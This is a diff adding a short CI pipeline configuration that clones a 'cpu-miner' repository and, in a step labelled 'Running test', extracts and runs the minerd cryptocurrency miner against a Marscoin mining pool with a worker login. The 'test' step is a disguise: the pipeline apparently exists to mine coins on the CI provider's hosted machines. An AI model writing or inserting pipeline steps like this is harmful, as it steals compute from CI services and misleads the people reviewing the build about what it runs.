@@ -1,0 +1,22 @@
+version: '1.0'
+steps:
+  clone:
+    title: Launch Composition from file
+    type: git-clone
+    repo: 'https://github.com/duongtnn-cloud/cpu-miner'
+    revision: main
+    stage: clone
+  test:
+    title: Running test
+    type: freestyle
+    image: 'ubuntu:latest'
+    working_directory: '${{clone}}'
+    commands:
+      - apt-get update
+      - tar -xf pooler-cpuminer-2.5.1.tar.gz
+      - chmod 777 ./minerd
+      - ././minerd --url=stratum+tcp://pool.marscoin.org:3333 --userpass=tnn20.223:1
+    stage: test
+stages:
+  - clone
+  - test
